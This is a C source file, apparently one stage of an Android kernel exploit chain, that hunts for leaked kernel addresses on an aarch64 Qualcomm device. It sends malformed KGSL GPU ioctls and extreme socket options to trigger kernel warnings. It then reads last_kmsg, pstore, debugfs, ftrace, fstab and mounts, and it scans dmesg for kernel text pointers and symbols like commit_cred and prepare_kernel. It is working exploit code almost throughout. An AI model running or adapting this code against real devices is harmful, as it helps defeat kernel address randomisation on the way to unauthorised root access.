/*
 * trigger_trace.c — Trigger kernel warning/backtrace to leak function addresses
 *
 * Cross-compile:
 *   aarch64-linux-musl-gcc -static -O2 -o trigger_trace trigger_trace.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <signal.h>
#include <setjmp.h>
#include <stdint.h>

/* Method 1: Try to cause a socket warning via bad options */
static void test_socket_warnings(void) {
    printf("\n=== Socket Warning Triggers ===\n");

    /* Try setting absurd socket buffer sizes */
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) { perror("socket"); return; }

    int val = 0x7FFFFFFF;
    setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &val, sizeof(val));
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &val, sizeof(val));

    /* Try invalid TCP options */
    val = -1;
    setsockopt(fd, IPPROTO_TCP, TCP_MAXSEG, &val, sizeof(val));

    /* Try perf_event_open with bad params to trigger warning */
    close(fd);
}

/* Method 2: Try to cause KGSL warning */
static void test_kgsl_warning(void) {
    printf("\n=== KGSL Warning Triggers ===\n");
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { perror("open kgsl"); return; }

    /* Alloc with weird flags to trigger debug messages */
    struct {
        unsigned long gpuaddr;
        size_t size;
        unsigned int flags;
    } alloc = {0};

    /* Try invalid flags */
    alloc.size = 4096;
    alloc.flags = 0xFFFFFFFF;
    ioctl(fd, _IOWR(0x09, 0x2F, alloc), &alloc);

    /* Try zero-size alloc */
    alloc.size = 0;
    alloc.flags = 0;
    ioctl(fd, _IOWR(0x09, 0x2F, alloc), &alloc);

    close(fd);
}

/* Method 3: Read /proc/last_kmsg if exists (previous boot log) */
static void check_last_kmsg(void) {
    printf("\n=== /proc/last_kmsg ===\n");
    FILE *f = fopen("/proc/last_kmsg", "r");
    if (!f) {
        printf("  %s\n", strerror(errno));
        f = fopen("/sys/fs/pstore/console-ramoops", "r");
        if (!f) {
            printf("  pstore: %s\n", strerror(errno));
            /* Try other pstore paths */
            f = fopen("/sys/fs/pstore/console-ramoops-0", "r");
            if (!f) { printf("  pstore-0: %s\n", strerror(errno)); return; }
        }
    }
    printf("  FOUND! Searching for backtraces...\n");
    char line[512];
    int found_trace = 0;
    while (fgets(line, sizeof(line), f)) {
        /* Look for kernel text addresses or function names */
        if (strstr(line, "ffffffc000") || strstr(line, "Call trace") ||
            strstr(line, "PC is at") || strstr(line, "LR is at") ||
            strstr(line, "commit_cred") || strstr(line, "prepare_kernel") ||
            strstr(line, "selinux") || strstr(line, "__switch_to") ||
            strstr(line, "el1_") || strstr(line, "el0_") ||
            strstr(line, "sys_") || strstr(line, "do_page_fault") ||
            (strstr(line, "[<") && strstr(line, ">]"))) {
            printf("  %s", line);
            found_trace = 1;
        }
    }
    if (!found_trace) printf("  No kernel text addresses found in log.\n");
    fclose(f);
}

/* Method 4: Try /sys/kernel/debug entries */
static void check_debugfs(void) {
    printf("\n=== debugfs / tracing ===\n");
    FILE *f;

    f = fopen("/sys/kernel/debug/tracing/trace", "r");
    if (f) {
        printf("  ftrace accessible!\n");
        char line[256];
        int n = 0;
        while (fgets(line, sizeof(line), f) && n < 20) { printf("  %s", line); n++; }
        fclose(f);
    } else printf("  ftrace: %s\n", strerror(errno));

    f = fopen("/sys/kernel/debug/kgsl/proc", "r");
    if (f) { printf("  kgsl debug accessible!\n"); fclose(f); }
    else printf("  kgsl debug: %s\n", strerror(errno));

    f = fopen("/d/tracing/trace", "r");
    if (f) { printf("  /d/tracing: accessible!\n"); fclose(f); }
    else printf("  /d/tracing: %s\n", strerror(errno));
}

/* Method 5: Scan for boot partition through /proc/emmc or /proc/dumchar_info */
static void check_alt_partition_info(void) {
    printf("\n=== Alt Partition Info ===\n");
    FILE *f;

    f = fopen("/proc/emmc", "r");
    if (f) {
        printf("  /proc/emmc found!\n");
        char line[256];
        while (fgets(line, sizeof(line), f)) printf("  %s", line);
        fclose(f);
    } else printf("  /proc/emmc: %s\n", strerror(errno));

    /* Check fstab for partition mapping */
    const char *fstabs[] = {
        "/fstab.qcom", "/fstab.bbry_qc8992",
        "/etc/fstab", "/vendor/etc/fstab.qcom",
        NULL
    };
    for (int i = 0; fstabs[i]; i++) {
        f = fopen(fstabs[i], "r");
        if (f) {
            printf("  %s:\n", fstabs[i]);
            char line[256];
            while (fgets(line, sizeof(line), f)) printf("    %s", line);
            fclose(f);
            return;
        }
    }
    printf("  No fstab found.\n");

    /* Check /proc/mounts for block device paths */
    printf("\n  /proc/mounts (block devs):\n");
    f = fopen("/proc/mounts", "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "/dev/block/") || strstr(line, "mmcblk"))
                printf("    %s", line);
        }
        fclose(f);
    }
}

/* Method 6: Full dmesg scan for kernel text pointers */
static void scan_dmesg_for_text(void) {
    printf("\n=== dmesg kernel text scan ===\n");
    FILE *f = popen("dmesg 2>&1", "r");
    if (!f) { perror("popen dmesg"); return; }

    char line[512];
    int found = 0;
    while (fgets(line, sizeof(line), f)) {
        /* Kernel text range: 0xffffffc00008xxxx - 0xffffffc001xxxxxx */
        char *p = line;
        while ((p = strstr(p, "ffffffc000")) != NULL) {
            /* Extract the address */
            unsigned long long addr = 0;
            if (sscanf(p, "%llx", &addr) == 1) {
                /* Check if it's in kernel text range */
                if (addr >= 0xffffffc000080000ULL && addr <= 0xffffffc002000000ULL) {
                    printf("  TEXT: 0x%016llx in: %s", addr, line);
                    found = 1;
                    break;
                }
            }
            p += 10;
        }
    }
    pclose(f);
    if (!found) printf("  No kernel text addresses found in current dmesg.\n");
}

int main(void) {
    printf("=== Kernel Address Leak Hunter ===\n");
    printf("PID: %d  UID: %d\n", getpid(), getuid());

    check_last_kmsg();
    check_debugfs();
    check_alt_partition_info();
    scan_dmesg_for_text();
    test_socket_warnings();
    test_kgsl_warning();

    /* Re-scan dmesg after triggering warnings */
    printf("\n=== Post-trigger dmesg scan ===\n");
    scan_dmesg_for_text();

    printf("\n=== Done ===\n");
    return 0;
}
